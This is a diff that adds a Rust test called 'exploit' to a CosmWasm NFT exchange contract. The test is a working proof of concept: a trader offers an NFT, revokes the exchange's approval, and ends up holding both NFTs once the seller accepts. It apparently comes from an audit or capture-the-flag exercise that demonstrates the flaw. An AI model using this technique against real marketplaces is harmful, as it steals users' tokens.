@@ -448,4 +448,113 @@ pub mod tests {
             .unwrap();
         assert_eq!(owner_of.owner, USER1.to_string());
     }
+
+    #[test]
+    fn exploit() {
+        let (mut app, contract_addr, token_addr) = proper_instantiate();
+
+        // Approve to transfer the NFT
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
+                spender: contract_addr.to_string(),
+                token_id: NFT2.to_string(),
+                expires: None,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // Approve to transfer the NFT
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
+                spender: contract_addr.to_string(),
+                token_id: NFT1.to_string(),
+                expires: None,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // Create a new tradable sale
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::NewSale {
+                id: NFT1.to_string(),
+                price: Uint128::from(150u128),
+                tradable: true,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // Create trade offer
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::NewTrade {
+                target: NFT1.to_string(),
+                offered: NFT2.to_string(),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // immediately revoke approval to exchange contract
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Revoke::<Empty, Empty> {
+                spender: contract_addr.to_string(),
+                token_id: NFT2.to_string(),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // USER1 accepts trade
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr,
+            &ExecuteMsg::AcceptTrade {
+                id: NFT1.to_string(),
+                trader: USER2.to_string(),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // we receive NFT1 as expected
+        let owner_of: OwnerOfResponse = app
+            .wrap()
+            .query_wasm_smart(
+                token_addr.clone(),
+                &Cw721QueryMsg::OwnerOf {
+                    token_id: NFT1.to_string(),
+                    include_expired: None,
+                },
+            )
+            .unwrap();
+        assert_eq!(owner_of.owner, USER2.to_string());
+
+        // but we still own NFT2 as well!
+        // they accepted our trade offer but never received it
+        // rugged
+        let owner_of: OwnerOfResponse = app
+            .wrap()
+            .query_wasm_smart(
+                token_addr,
+                &Cw721QueryMsg::OwnerOf {
+                    token_id: NFT2.to_string(),
+                    include_expired: None,
+                },
+            )
+            .unwrap();
+        assert_eq!(owner_of.owner, USER2.to_string());
+
+    }
 }
